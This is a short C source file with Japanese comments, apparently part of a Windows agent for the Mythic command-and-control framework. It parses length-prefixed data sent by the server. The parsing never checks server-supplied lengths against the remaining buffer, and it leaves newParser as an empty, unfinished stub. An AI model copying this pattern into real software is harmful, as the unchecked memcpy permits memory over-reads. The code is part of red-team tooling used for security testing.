#include <windows.h>
#include "../include/parser.h"

// データに-は存在しないのでUINT32
UINT32 getUInt32(PParser parser) {
    UINT32 value = *(UINT32*)parser->buffer; // UINT32のポインタとしてキャストして更にデリファレンスして値を取得している。

    parser->buffer += sizeof(UINT32); // メモリの読む位置を更新する。
    parser->length -= sizeof(UINT32); // 残りのメモリの長さを更新する。

    return value;
}

PBYTE getBytes(PParser parser, PSIZE_T size)
{
    SIZE_T length = 0;
    if (*size == 0) // サイズのポインタが0の場合(開始位置の場合)Mythicサーバーが期待しているエージェントから贈られるデータ量(int32)を渡すお約束
    // mythicサーバは最初の4バイトはデータの量を受け取る。
    {
        length = (SIZE_T)getUInt32(parser);
        *size = length; // 呼び出し元にどのぐらいのサイズだったか伝える。
    }
    else //それ以外の時はどのぐらいのサイズでくるのかわからないから解析する。
    {
        length = *size;
    }
    PBYTE outData = (PBYTE)LocalAlloc(LPTR, length); // pbyteで単位を統一する Localallowcは型が決まっていない
    memcpy(outData, parser->buffer, length);

    parser->buffer += length; // メモリの読む位置を更新する。
    parser->length -= length; // 残りのメモリの長さを更新する。

    return outData;
}

PParser newParser(){

}


